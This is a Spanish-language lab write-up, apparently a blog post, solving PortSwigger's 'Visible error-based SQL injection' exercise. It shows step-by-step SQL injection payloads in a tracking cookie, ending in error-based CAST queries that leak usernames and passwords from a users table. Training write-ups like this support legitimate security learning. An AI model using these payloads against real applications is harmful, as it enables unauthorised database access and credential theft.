---
title: "18 Visible error-based SQL injection"
collection: publications
category: portswigger
permalink: publications/SQLi/18_Visible error-based SQL injection
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. No se devuelven los resultados de la consulta SQL.'
date: 2024-12-02
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Visible error-based SQL injection'
---

![logo]({{site.url}}/images/SQLi/sqli-18/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-18/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, encuentra la forma de filtrar la contraseña del usuario administrador y, a continuación, accede a su cuenta.

## Buscamos el vector de ataque

Realizamos busqueda de URL's que realicen consulta a la BD para ver si es una posible realizar un ataque de SQLi.

![Vector]({{site.url}}/images/SQLi/sqli-18/vector.png)

## Probamos que el TrackingId es vulnerable

```sql
'--
```

![Vulnerable]({{site.url}}/images/SQLi/sqli-18/vulnerable.png)

## Obtenemos cantidad de columnas

```sql
' ORDER BY 1--
```

![Columnas]({{site.url}}/images/SQLi/sqli-18/columnas.png)

## Miramos que sea de tipo String

```sql
' UNION SELECT 'A'--
```

![String]({{site.url}}/images/SQLi/sqli-18/string.png)

## Obtener el primer usuario de la tabla users

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--
```

![Usuario]({{site.url}}/images/SQLi/sqli-18/primer usuario.png)

## Obtener el password del primer usuario

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--
```

![Password]({{site.url}}/images/SQLi/sqli-18/password.png)

## Login

![Login]({{site.url}}/images/SQLi/sqli-18/login.png)

## Resuelto

![Resuelto]({{site.url}}/images/SQLi/sqli-18/resuelto.png)
